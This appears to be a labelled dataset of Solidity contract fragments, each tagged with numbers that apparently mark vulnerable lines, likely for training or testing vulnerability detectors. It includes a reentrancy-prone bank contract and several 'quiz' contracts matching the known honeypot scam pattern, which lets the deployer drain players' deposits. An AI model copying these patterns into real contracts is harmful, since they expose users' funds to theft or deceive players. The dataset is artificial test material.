        bytes32 hashAuditorRequestorCode = keccak256(_auditor, msg.sender, _codeHash);
        AuditRequest storage request = auditRequests[hashAuditorRequestorCode];
        require(request.amount > 0);
        require(now > request.expireDate);
        uint amount = request.amount;
        delete request.amount;
        delete request.expireDate;
        rewards[hashAuditorCode] = rewards[hashAuditorCode].sub(amount);
        totalRequestsAmount = totalRequestsAmount.sub(amount);
        emit RequestWithdrawn(_auditor, msg.sender, _codeHash, amount);
        msg.sender.transfer(amount);
    }
    /// @notice marks contract as audited
    /// @param _codeHash the code hash of the stamped contract. _codeHash equals to sha3 of the contract byte-code
    /// @param _isApproved whether the contract is approved or rejected
    function auditContract(bytes32 _codeHash, bool _isApproved)
    public whenNotPaused
    {
        bytes32 hashAuditorCode = keccak256(msg.sender, _codeHash);
        // revert if the contract is already audited by the auditor
        uint8 outcome = auditOutcomes[hashAuditorCode];
        require(outcome == NOT_AUDITED);
        if ( _isApproved )
            auditOutcomes[hashAuditorCode] = AUDITED_AND_APPROVED;
        else
            auditOutcomes[hashAuditorCode] = AUDITED_AND_REJECTED;
        uint reward = rewards[hashAuditorCode];
        totalRequestsAmount = totalRequestsAmount.sub(reward);
        commission = calcCommission(reward);
        availableCommission = availableCommission.add(commission);
        emit ContractAudited(msg.sender, _codeHash, reward, _isApproved);
        msg.sender.transfer(reward.sub(commission));
    }
    /// @dev const value to indicate the maximum commision service owner can set
    uint public constant MAX_COMMISION = 33;
    /// @notice ability for owner to change the service commmission
    /// @param _newCommission new commision percentage
    function changeCommission(uint _newCommission) public onlyOwner whenNotPaused {
        require(_newCommission <= MAX_COMMISION);
        require(_newCommission != commission);
        commission = _newCommission;
        emit NewCommission(commission);
    }
    /// @notice calculates the SolidStamp commmission
    /// @param _amount amount to calcuate the commission from
    function calcCommission(uint _amount) private view returns(uint) {
        return _amount.mul(commission)/100; // service commision
    }
    /// @notice ability for owner to withdraw the commission
    /// @param _amount amount to withdraw
    function withdrawCommission(uint _amount) public onlyOwner {
        // cannot withdraw money reserved for requests
        require(_amount <= availableCommission);
        availableCommission = availableCommission.sub(_amount);
        msg.sender.transfer(_amount);
    }
    /// @dev Override unpause so we can't have newContractAddress set,
    ///  because then the contract was upgraded.
    /// @notice This is public rather than external so we can call super.unpause
    ///  without using an expensive CALL.
    function unpause() public onlyOwner whenPaused {
        require(newContractAddress == address(0));
        // Actually unpause the contract.
        super.unpause();
    }
    /// @notice We don't welcome tips & donations
    function() payable public {
        revert();",[64]
"}
interface Router {
	function WETH() external pure returns (address);
	function factory() external pure returns (address);
}
interface Factory {
	function getPair(address, address) external view returns (address);
	function createPair(address, address) external returns (address);
}
interface Pair {
	function token0() external view returns (address);
	function totalSupply() external view returns (uint256);
	function balanceOf(address) external view returns (uint256);
	function allowance(address, address) external view returns (uint256);
	function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
	function transfer(address, uint256) external returns (bool);
	function transferFrom(address, address, uint256) external returns (bool);
}
contract KRILL {
	uint256 constant private UINT_MAX = type(uint256).max;
	uint256 constant private TRANSFER_FEE = 1; // 1% per transfer
	string constant public name = ""Krill Token"";
	string constant public symbol = ""KRILL"";
	uint8 constant public decimals = 18;
	struct User {
		uint256 balance;
		mapping(address => uint256) allowance;
	}
	struct Info {
		uint256 totalSupply;
		mapping(address => User) users;
		mapping(address => bool) toWhitelist;
		mapping(address => bool) fromWhitelist;
		address owner;
		Router router;
		Pair pair;
		bool weth0;
		WhalesGame wg;
		StakingRewards stakingRewards;
	}
	Info private info;
	event Transfer(address indexed from, address indexed to, uint256 tokens);
	event Approval(address indexed owner, address indexed spender, uint256 tokens);
	event WhitelistUpdated(address indexed user, bool fromWhitelisted, bool toWhitelisted);
	modifier _onlyOwner() {
		require(msg.sender == owner());
		_;
	}
	constructor() {
		info.router = Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
		info.pair = Pair(Factory(info.router.factory()).createPair(info.router.WETH(), address(this)));
		info.weth0 = info.pair.token0() == info.router.WETH();
		info.owner = msg.sender;
	}
	function setOwner(address _owner) external _onlyOwner {
		info.owner = _owner;
	}
	function setWhitelisted(address _address, bool _fromWhitelisted, bool _toWhitelisted) external _onlyOwner {
		info.fromWhitelist[_address] = _fromWhitelisted;
		info.toWhitelist[_address] = _toWhitelisted;
		emit WhitelistUpdated(_address, _fromWhitelisted, _toWhitelisted);
	}
	function deploySetWhalesGame(WhalesGame _wg) external {
		require(tx.origin == owner() && stakingRewardsAddress() == address(0x0));
		info.wg = _wg;
		info.stakingRewards = new StakingRewards(info.wg, info.pair);
		_approve(address(this), stakingRewardsAddress(), UINT_MAX);
	}
	function mint(address _receiver, uint256 _tokens) external {
		require(msg.sender == address(info.wg));
		info.totalSupply += _tokens;
		info.users[_receiver].balance += _tokens;
		emit Transfer(address(0x0), _receiver, _tokens);
	}
	function burn(uint256 _tokens) external {
		require(balanceOf(msg.sender) >= _tokens);
		info.totalSupply -= _tokens;
		info.users[msg.sender].balance -= _tokens;
		emit Transfer(msg.sender, address(0x0), _tokens);
	}
	function transfer(address _to, uint256 _tokens) external returns (bool) {
		return _transfer(msg.sender, _to, _tokens);
	}
	function approve(address _spender, uint256 _tokens) external returns (bool) {
		return _approve(msg.sender, _spender, _tokens);
	}
	function transferFrom(address _from, address _to, uint256 _tokens) external returns (bool) {
		uint256 _allowance = allowance(_from, msg.sender);
		require(_allowance >= _tokens);
		if (_allowance != UINT_MAX) {
			info.users[_from].allowance[msg.sender] -= _tokens;
		}
		return _transfer(_from, _to, _tokens);
	}
	function transferAndCall(address _to, uint256 _tokens, bytes calldata _data) external returns (bool) {
		uint256 _balanceBefore = balanceOf(_to);
		_transfer(msg.sender, _to, _tokens);
		uint256 _tokensReceived = balanceOf(_to) - _balanceBefore;
		uint32 _size;
		assembly {
			_size := extcodesize(_to)
		}
		if (_size > 0) {
			require(Callable(_to).tokenCallback(msg.sender, _tokensReceived, _data));
		}
		return true;
	}
	function whalesGameAddress() public view returns (address) {
		return address(info.wg);
	}
	function pairAddress() external view returns (address) {
		return address(info.pair);
	}
	function stakingRewardsAddress() public view returns (address) {
		return address(info.stakingRewards);
	}
	function owner() public view returns (address) {
		return info.owner;
	}
	function isFromWhitelisted(address _address) public view returns (bool) {
		return info.fromWhitelist[_address];
	}
	function isToWhitelisted(address _address) public view returns (bool) {
		return info.toWhitelist[_address];
	}
	function totalSupply() public view returns (uint256) {
		return info.totalSupply;
	}",[64]
"pragma solidity ^0.4.24;
interface HourglassInterface {
    function buy(address _playerAddress) payable external returns(uint256);
    function withdraw() external;
}
interface StrongHandsManagerInterface {
    function mint(address _owner, uint256 _amount) external;
}
contract StrongHandsManager {
    event CreateStrongHand(address indexed owner, address indexed strongHand);
    event MintToken(address indexed owner, uint256 indexed amount);
    mapping (address => address) public strongHands;
    mapping (address => uint256) public ownerToBalance;
    //ERC20
    string public constant name = ""Stronghands3D"";
    string public constant symbol = ""S3D"";
    uint8 public constant decimals = 18;
    uint256 internal tokenSupply = 0;
    function getStrong()
        public
    {
        require(strongHands[msg.sender] == address(0), ""you already became a Stronghand"");
        strongHands[msg.sender] = new StrongHand(msg.sender);
        emit CreateStrongHand(msg.sender, strongHands[msg.sender]);
    }
    function mint(address _owner, uint256 _amount)
        external
    {
        require(strongHands[_owner] == msg.sender);
        tokenSupply+= _amount;
        ownerToBalance[_owner]+= _amount;
        emit MintToken(_owner, _amount);
    }
    //ERC20
    function totalSupply()
        public
        view
        returns (uint256)
    {
       return tokenSupply;
    }
    function balanceOf(address _owner)
        public
        view
        returns (uint256)
    {
        return ownerToBalance[_owner];
    }
}
contract StrongHand {
    HourglassInterface constant p3dContract = HourglassInterface(0xB3775fB83F7D12A36E0475aBdD1FCA35c091efBe);
    StrongHandsManagerInterface strongHandManager;
    address public owner;
    modifier onlyOwner()
    {
        require(msg.sender == owner);
        _;
    }
    constructor(address _owner)
        public
    {
        owner = _owner;
        strongHandManager = StrongHandsManagerInterface(msg.sender);
    }
    function() public payable {}
    function buy(address _referrer)
        external
        payable
        onlyOwner
    {
        purchase(msg.value, _referrer);
    }
    function purchase(uint256 _amount, address _referrer)
        private
    {
         uint256 amountPurchased = p3dContract.buy.value(_amount)(_referrer);
         strongHandManager.mint(owner, amountPurchased);
    }
    function withdraw()
        external
        onlyOwner
    {
        p3dContract.withdraw();
        owner.transfer(address(this).balance);
    }
}",[31]
"    function initialize(address _owner) public {
        require(!initialized());
        setOwner(_owner);
        setArrayLimit(200);
        setDiscountStep(0.00005 ether);
        setFee(0.00001 ether);
        boolStorage[keccak256(""rs_multisender_initialized"")] = true;
    }
    function initialized() public view returns (bool) {
        return boolStorage[keccak256(""rs_multisender_initialized"")];
    }
    function txCount(address customer) public view returns(uint256) {
        return uintStorage[keccak256(""txCount"", customer)];
    }
    function arrayLimit() public view returns(uint256) {
        return uintStorage[keccak256(""arrayLimit"")];
    }
    function setArrayLimit(uint256 _newLimit) public onlyOwner {
        require(_newLimit != 0);
        uintStorage[keccak256(""arrayLimit"")] = _newLimit;
    }
    function discountStep() public view returns(uint256) {
        return uintStorage[keccak256(""discountStep"")];
    }
    function setDiscountStep(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""discountStep"")] = _newStep;
    }
    function fee() public view returns(uint256) {
        return uintStorage[keccak256(""fee"")];
    }
    function currentFee(address _customer) public view returns(uint256) {
        if (fee() > discountRate(msg.sender)) {
            return fee().sub(discountRate(_customer));
        } else {
            return 0;
        }
    }
    function setFee(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""fee"")] = _newStep;
    }
    function discountRate(address _customer) public view returns(uint256) {
        uint256 count = txCount(_customer);
        return count.mul(discountStep());
    }
    function multisendToken(address token, address[] _contributors, uint256[] _balances) public hasFee payable {
        if (token == 0x000000000000000000000000000000000000bEEF){
            multisendEther(_contributors, _balances);
        } else {
            uint256 total = 0;
            require(_contributors.length <= arrayLimit());
            ERC20 erc20token = ERC20(token);
            uint8 i = 0;
            for (i; i < _contributors.length; i++) {
                erc20token.transferFrom(msg.sender, _contributors[i], _balances[i]);
                total += _balances[i];
            }
            setTxCount(msg.sender, txCount(msg.sender).add(1));
            Multisended(total, token);
        }
    }
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 fee = currentFee(msg.sender);
        require(total >= fee);
        require(_contributors.length <= arrayLimit());
        total = total.sub(fee);
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i]);
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        setTxCount(msg.sender, txCount(msg.sender).add(1));
        Multisended(msg.value, 0x000000000000000000000000000000000000bEEF);
    }
    function claimTokens(address _token) public onlyOwner {
        if (_token == 0x0) {
            owner().transfer(this.balance);
            return;
        }
        ERC20 erc20token = ERC20(_token);
        uint256 balance = erc20token.balanceOf(this);
        erc20token.transfer(owner(), balance);
        ClaimedTokens(_token, owner(), balance);
    }
    function setTxCount(address customer, uint256 _txCount) private {
        uintStorage[keccak256(""txCount"", customer)] = _txCount;
    }
}","[56, 73]"
"pragma solidity ^0.4.20;
contract SuperQuest
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"  function getReward(address voter) public {
    require(closed);
    require(voted[voter]);
    require(claimed[voter] == false);
    if(tie) {
      voter.transfer(stake[voter]);
    }
    // majority gets rewarded
    if(votes[voter] == validResult) {
      voter.transfer(stake[voter] + majorityReward);
    } // minority loses all
    claimed[voter] = true;
  }
  function hasClaimed(address voter) public constant returns (bool) {
    return claimed[voter];
  }
  function () public payable {}
}
// Contract written by MaximeHg
// https://github.com/MaximeHg/sb52-contracts
// Special thanks to moodysalem and its ethersquares contracts for the inspiration!
// https://github.com/ethersquares/ethersquares-contracts
contract Superbowl52 {
  using SafeMath for uint;
  uint public constant GAME_START_TIME = 1517787000;
  bool public resultConfirmed = false;
  address public owner;
  mapping(address => betting) public bets;
  uint public totalBets;
  uint public philadelphiaBets;
  uint public newEnglandBets;
  uint public result;
  uint public betters;
  bool public votingOpen;
  bool public withdrawalOpen;
  uint public threshold;
  uint public winningPot;
  mapping(address => uint) public wins;
  BallotSB52 public ballot;
  struct betting {
    uint philadelphiaBets;
    uint newEnglandBets;
    bool claimed;
  }
  function Superbowl52() public {
    require(now<GAME_START_TIME);
    owner = msg.sender;
    result = 0;
    votingOpen = false;
    withdrawalOpen = false;
    // 90%
    threshold = 90000;
    winningPot = 0;
  }
  // team 1 is Philadelphia
  // team 2 is New England
  // a bet is final and you cannot change it
  function bet(uint team) public payable {
    require(team == 1 || team == 2);
    require(now <= GAME_START_TIME);
    require(msg.value > 0);
    if(!hasBet(msg.sender)) betters += 1;
    if(team == 1) {
      bets[msg.sender].philadelphiaBets += msg.value;
      philadelphiaBets += msg.value;
    } else if (team == 2) {
      bets[msg.sender].newEnglandBets += msg.value;
      newEnglandBets += msg.value;
    }
    totalBets += msg.value;
  }
  function () public payable {
    revert();
  }
  function getPhiladelphiaBets(address better) public constant returns (uint) {
    return bets[better].philadelphiaBets;
  }
  function getNewEnglandBets(address better) public constant returns (uint) {
    return bets[better].newEnglandBets;
  }
  function hasClaimed(address better) public constant returns (bool) {
    return bets[better].claimed;
  }
  function startVoting() public {
    require(votingOpen == false);
    require(withdrawalOpen == false);
    require(now >= GAME_START_TIME + 8 hours);
    votingOpen = true;
    ballot = new BallotSB52(threshold);
  }
  function hasBet(address better) public constant returns (bool) {
    return (bets[better].philadelphiaBets + bets[better].newEnglandBets) > 0;
  }
  function endVoting() public {
    require(votingOpen);
    result = ballot.closeBallot();
    // ballot ends with success
    if (result == 1 || result == 2) {
      withdrawalOpen = true;
      votingOpen = false;
    } else if (result == 9) {
      votingOpen = false;
      withdrawalOpen = false;
    } else {
      threshold = threshold - 5000;
      ballot = new BallotSB52(threshold);
    }
    if(result == 1) winningPot = totalBets.sub(newEnglandBets.div(100));
    if(result == 2) winningPot = totalBets.sub(philadelphiaBets.div(100));
  }
  function getLosersOnePercent(uint loser) public returns (uint) {
    require(votingOpen);
    require(msg.sender == address(ballot));
    if(loser==1) {
      ballot.transfer(philadelphiaBets.div(100));
      return philadelphiaBets.div(100);
    }
    else if (loser==2) {
      ballot.transfer(newEnglandBets.div(100));
      return newEnglandBets.div(100);
    }
    else {
      return 0;
    }
  }
  // triggered only if tie in the final ballot
  function breakTie(uint team) {
    require(result == 9);",[64]
"    bool public allowMint = false;
    bool public allowBurn = false;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;
    constructor (
        string memory _name,string memory _symbol,uint _totalSupply,
        bool _allowMint, bool _allowBurn
    ) public {
        name = _name;
        symbol = _symbol;
        totalSupply = _totalSupply * 10 ** decimals;
        allowMint = _allowMint;
        allowBurn = _allowBurn;
        //solium-disable-next-line
        developTime = block.timestamp;
    }
    function _approve(address from, address spender, uint value) internal {
        allowance[from][spender] = value;
        emit Approval(from, spender, value);
    }
    function _transfer(address from, address to, uint value) internal {
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(from, to, value);
    }
    function _transferFrom(address spender, address from, address to, uint value) internal {
        if (allowance[from][spender] != uint(-1)) {
            allowance[from][spender] = allowance[from][spender].sub(value);
        }
        _transfer(from, to, value);
    }
    function approve(address spender, uint value) external returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }
    function transfer(address to, uint value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }
    function transferFrom(address from, address to, uint value) external returns (bool) {
        _transferFrom(msg.sender, from, to, value);
        return true;
    }
    function transferBatch(address[] calldata addresses, uint[] calldata values) external payable returns (bool success){
        require(
            addresses.length > 0 &&
            (addresses.length == values.length || values.length == 1),
            '1005'
        );
        uint256 total = 0;
        uint256 length = addresses.length;
        if(values.length == 1){
            total = values[0].mul(length);
        }else{
            for(uint256 i = 0 ; i < length; i++){
                total = total.add(values[i]);
            }
        }
        require(msg.value > 0 ? msg.value >= total : balanceOf[msg.sender] >= total,""1002"");
        for(uint i = 0 ; i < addresses.length; i++){
            address to = addresses[i];
            uint amount = (values.length == 1) ? values[0] : values[i];
            if(msg.value > 0){
                address(uint160(to)).transfer(amount);
            }else{
                _transfer(msg.sender, to, amount);
            }
        }
        return true;
    }
    function setSellRatio(uint ratio) external onlyOwner{
        sellRatio = ratio;
    }
}
contract UserToken is BaseERC20{
    using SafeMath for uint;
    event Buy(address indexed from,uint value,uint tokens);
    event Mint(address indexed from,uint amount,uint total,uint balance);
    event Burn(address indexed from,uint amount,uint total,uint balance);
    constructor(
        address _owner,string memory _name,string memory _symbol,uint _totalSupply,
        bool _allowMint, bool _allowBurn
    ) BaseERC20(_name,_symbol,_totalSupply,_allowMint,_allowBurn) public {
        owner = _owner;
        balanceOf[owner] = totalSupply;
    }
    function () external payable {
        buy();
    }
    function buy() public payable{
        require(sellRatio > 0, '3000');
        uint tokens = msg.value.mul(sellRatio);
        _transfer(owner,msg.sender,tokens);
        address(uint160(owner)).transfer(msg.value);
        emit Buy(msg.sender, msg.value, tokens);
    }
    function mint(address account, uint amount) external onlyOwner{
        require(allowMint,""3001"");
        totalSupply = totalSupply.add(amount);
        balanceOf[account] = balanceOf[account].add(amount);
        emit Mint(account,amount,totalSupply,balanceOf[account]);
    }
    function burn(uint amount) external{
        require(allowBurn,""3002"");
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(amount);
        totalSupply = totalSupply.sub(amount);
        emit Burn(msg.sender, amount, totalSupply,balanceOf[msg.sender]);
    }
    function setDesc(string calldata _desc) external onlyOwner{
        desc = _desc;
    }
    function viewSummary() external view returns (
        string memory _name,string memory _symbol,uint _decimals,uint _totalSupply,
        bool _allowMint, bool _allowBurn,uint _sellRatio,uint _developTime,string memory _desc
    ){
        return (name,symbol,decimals,totalSupply,allowMint,allowBurn,sellRatio,developTime,desc);
    }
}
contract TGToken is BaseERC20 {
    using SafeMath for uint;
    address public lastMintContract;
    mapping(address => bool) mintContracts;
    uint public limitSupply;
    uint sellQuantity = 0;
    mapping(address => UserToken) public factorys;
    bytes32 DOMAIN_SEPARATOR;
    bytes32 constant AIRDROP_TYPE = keccak256('AirDrop(address receiver,address issuer,uint256 value,uint256 nonce)');
    bytes32 public constant PERMIT_TYPE = keccak256('Permit(address owner,address spender,uint256 value)');",[64]
"pragma solidity ^0.4.25;
contract THE_BANK
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 5 ether;    
    function THE_BANK(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.20;
contract THE_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"* @param amount amount of tokens Procured
*/
  event TokenProcurement(address indexed contributor, address indexed beneficiary, uint256 value, uint256 amount);
  function Crowdsale() public {
    token = createTokenContract();
    //soft cap in tokens
    softcap = 10000000 * 1 ether;
    hardcap = 50000000 * 1 ether;
    // start and end timestamps where investments are allowed
    //ico
      //start
    startIco = 1526403600;//2018 May 15, 12pm CST
      //end
    endIco = 1539622800;//2018 Oct 15 at 12pm CST
    // rate;
    rateIco = 670;
    // address where funds are collected
    wallet = 0xaa6072Cb5EcB3A1567F8Fdb4601620C4a808fD6c;
  }
  function setRateIco(uint _rateIco) public onlyOwner  {
    rateIco = _rateIco;
  }
  // fallback function can be used to Procure tokens
  function () external payable {
    procureTokens(msg.sender);
  }
  function createTokenContract() internal returns (TN) {
    return new TN();
  }
  // low level token Pledge function
  function procureTokens(address beneficiary) public payable {
    uint256 tokens;
    uint256 weiAmount = msg.value;
    uint256 backAmount;
    require(beneficiary != address(0));
    //ico
    if (now >= startIco && now < endIco && totalSoldTokens < hardcap){
      tokens = weiAmount.mul(rateIco);
      if (hardcap.sub(totalSoldTokens) < tokens){
        tokens = hardcap.sub(totalSoldTokens);
        weiAmount = tokens.div(rateIco);
        backAmount = msg.value.sub(weiAmount);
      }
      totalSoldTokens = totalSoldTokens.add(tokens);
    }
    require(tokens > 0);
    balances[msg.sender] = balances[msg.sender].add(msg.value);
    token.mint(msg.sender, tokens);
    if (backAmount > 0){
      balances[msg.sender] = balances[msg.sender].sub(backAmount);
      msg.sender.transfer(backAmount);
    }
    emit TokenProcurement(msg.sender, beneficiary, weiAmount, tokens);
  }
  function refund() public{
    require(totalSoldTokens < softcap && now > endIco);
    require(balances[msg.sender] > 0);
    uint value = balances[msg.sender];
    balances[msg.sender] = 0;
    msg.sender.transfer(value);
  }
  function transferEthToMultisig() public onlyOwner {
    address _this = this;
    require(totalSoldTokens >= softcap && now > endIco);
    wallet.transfer(_this.balance);
  }
}","[64, 65]"
"    }
    if (now >= startIcoPreICO.add(2 * 7 * 1 days) && now < startIcoPreICO.add(4 * 7 * 1 days)){
      bonus = 8;
    }
    if (now >= startIcoPreICO.add(4 * 7 * 1 days) && now < startIcoPreICO.add(6 * 7 * 1 days)){
      bonus = 6;
    }
    if (now >= startIcoPreICO.add(6 * 7 * 1 days) && now < startIcoPreICO.add(8 * 7 * 1 days)){
      bonus = 4;
    }
    if (now >= startIcoPreICO.add(8 * 7 * 1 days) && now < startIcoPreICO.add(10 * 7 * 1 days)){
      bonus = 2;
    }
    return rateICO + rateICO.mul(bonus).div(100);
  }
  // low level token Pledge function
  function procureTokens(address beneficiary) public payable {
    uint256 tokens;
    uint256 weiAmount = msg.value;
    uint256 backAmount;
    uint256 rate;
    uint hardCap;
    require(beneficiary != address(0));
    rate = getRateIcoWithBonus();
    //icoPreICO
    hardCap = hardcapPreICO;
    if (now >= startIcoPreICO && now < endIcoPreICO && totalSoldTokens < hardCap){
	  require(weiAmount >= minPurchasePreICO);
      tokens = weiAmount.mul(rate);
      if (hardCap.sub(totalSoldTokens) < tokens){
        tokens = hardCap.sub(totalSoldTokens);
        weiAmount = tokens.div(rate);
        backAmount = msg.value.sub(weiAmount);
      }
    }
    //icoMainSale
    hardCap = hardcapMainSale.add(hardcapPreICO);
    if (now >= startIcoMainSale  && now < endIcoMainSale  && totalSoldTokens < hardCap){
	  require(weiAmount >= minPurchaseMainSale);
      tokens = weiAmount.mul(rate);
      if (hardCap.sub(totalSoldTokens) < tokens){
        tokens = hardCap.sub(totalSoldTokens);
        weiAmount = tokens.div(rate);
        backAmount = msg.value.sub(weiAmount);
      }
    }
    require(tokens > 0);
    totalSoldTokens = totalSoldTokens.add(tokens);
    balances[msg.sender] = balances[msg.sender].add(weiAmount);
    token.mint(msg.sender, tokens);
	unconfirmedSum = unconfirmedSum.add(tokens);
	unconfirmedSumAddr[msg.sender] = unconfirmedSumAddr[msg.sender].add(tokens);
	token.SetPermissionsList(beneficiary, 1);
    if (backAmount > 0){
      msg.sender.transfer(backAmount);
    }
    emit TokenProcurement(msg.sender, beneficiary, weiAmount, tokens);
  }
  function refund() public{
    require(totalSoldTokens.sub(unconfirmedSum) < softcap && now > endIcoMainSale);
    require(balances[msg.sender] > 0);
    uint value = balances[msg.sender];
    balances[msg.sender] = 0;
    msg.sender.transfer(value);
  }
  function transferEthToMultisig() public onlyOwner {
    address _this = this;
    require(totalSoldTokens.sub(unconfirmedSum) >= softcap && now > endIcoMainSale);
    wallet.transfer(_this.balance);
  }
  function refundUnconfirmed() public{
    require(now > endIcoMainSale);
    require(balances[msg.sender] > 0);
    require(token.GetPermissionsList(msg.sender) == 1);
    uint value = balances[msg.sender];
    balances[msg.sender] = 0;
    msg.sender.transfer(value);
   // token.burn(msg.sender, token.balanceOf(msg.sender));
    uint uvalue = unconfirmedSumAddr[msg.sender];
    unconfirmedSumAddr[msg.sender] = 0;
    token.burn(msg.sender, uvalue );
   // totalICO = totalICO.sub(token.balanceOf(msg.sender));
  }
  function SetPermissionsList(address _address, uint8 _sign) public onlyOwner{
      uint8 sign;
      sign = token.GetPermissionsList(_address);
      token.SetPermissionsList(_address, _sign);
      if (_sign == 0){
          if (sign != _sign){
			unconfirmedSum = unconfirmedSum.sub(unconfirmedSumAddr[_address]);
			unconfirmedSumAddr[_address] = 0;
          }
      }
   }
   function GetPermissionsList(address _address) public constant onlyOwner returns(uint8){
     return token.GetPermissionsList(_address);
   }
   function pause() onlyOwner public {
     token.pause();
   }
   function unpause() onlyOwner public {
     token.unpause();
   }
}","[60, 69]"
"pragma solidity ^0.4.25;
contract TRU_GAME
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0xaf1cbdeeba1f767c9ccd4569db664af6410378af44fc246d2b3fce4b22428d52;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract TRYTOPLAY
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"        require(_value == 0.1755 ether);
        require(_gameWalletAddr != address(0));
        uint256 seed = _rand();
        uint256 lotteryRet = 0;
        uint256 lRet;
        uint256 cardCountTotal = 0;
        uint256 cardCount;
        for (uint256 i = 0; i < 5; ++i) {
            if (i > 0) {
                seed = _randBySeed(seed);
            }
            uint256 rdm = seed % 10000;
            seed /= 10000;
            if (rdm < 400) {
                lRet = _lotteryToken(seed, _gameWalletAddr, _buyer);
                if (lRet == 0) {
                    (lRet, cardCount) = _lotteryCardNoSend(seed);
                    cardCountTotal += cardCount;
                }
                lotteryRet += (lRet * (100 ** i));
            } else {
                (lRet, cardCount) = _lotteryCardNoSend(seed);
                cardCountTotal += cardCount;
                lotteryRet += (lRet * (100 ** i));
            }
        }
        require(cardCountTotal <= 50);
        if (cardCountTotal > 0) {
            tttcToken.safeSendCard(cardCountTotal, _gameWalletAddr);
        }
        lotteryHistory[_gameWalletAddr] = uint64(lotteryRet);
        emit LotteryResult(_buyer, _gameWalletAddr, 5, lotteryRet);
    }
    function withdrawERC20(address _erc20, address _target, uint256 _amount)
        external
    {
        require(msg.sender == addrFinance || msg.sender == addrAdmin);
        require(_amount > 0);
        address receiver = _target == address(0) ? addrFinance : _target;
        ERC20BaseInterface erc20Contract = ERC20BaseInterface(_erc20);
        uint256 balance = erc20Contract.balanceOf(address(this));
        require(balance > 0);
        if (_amount < balance) {
